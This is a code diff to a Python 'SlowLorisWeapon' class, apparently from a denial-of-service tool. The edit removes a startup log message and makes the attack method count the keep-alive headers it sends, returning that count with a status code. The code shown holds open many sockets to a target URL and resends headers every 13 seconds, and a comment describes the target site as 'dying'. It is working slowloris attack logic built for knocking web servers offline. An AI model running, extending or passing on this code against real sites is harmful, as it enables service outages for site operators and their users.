@@ -30,8 +30,6 @@ class SlowLorisWeapon(Weapon):
 
         self._num_sockets = kwargs['num_sockets'] if 'num_sockets' in kwargs else 100
 
-        self._is_initialised = False
-
         # all of the sockets currently connected to the target
         self._sockets = []
 
@@ -100,6 +98,8 @@ class SlowLorisWeapon(Weapon):
 
     def attack(self, target_url):
 
+        hits = 0  # total # hits to the server we did
+
         # send keep-alive headers to each of the sockets
         for sock in self._sockets:
 
@@ -110,6 +110,8 @@ class SlowLorisWeapon(Weapon):
                 sock.send(
                     keep_alive_header.encode("utf-8")
                 )
+
+                hits += 1
 
             except socket.error:
 
@@ -129,11 +131,6 @@ class SlowLorisWeapon(Weapon):
 
                 break
 
-        # log # sockets once initialised, so user knows we are ready to roll
-        if not self._is_initialised:
-            app.console.log("%d sockets spawned\n" % len(self._sockets))
-            self._is_initialised = True
-
         # wait a few seconds before we send headers again
         time.sleep(13)
 
@@ -141,4 +138,4 @@ class SlowLorisWeapon(Weapon):
         # 200 = OK, site is alive, 429 = too many connections, site is dying
         status_code = 200 if len(self._sockets) >= self._num_sockets else 429
 
-        return status_code
+        return (hits, status_code)
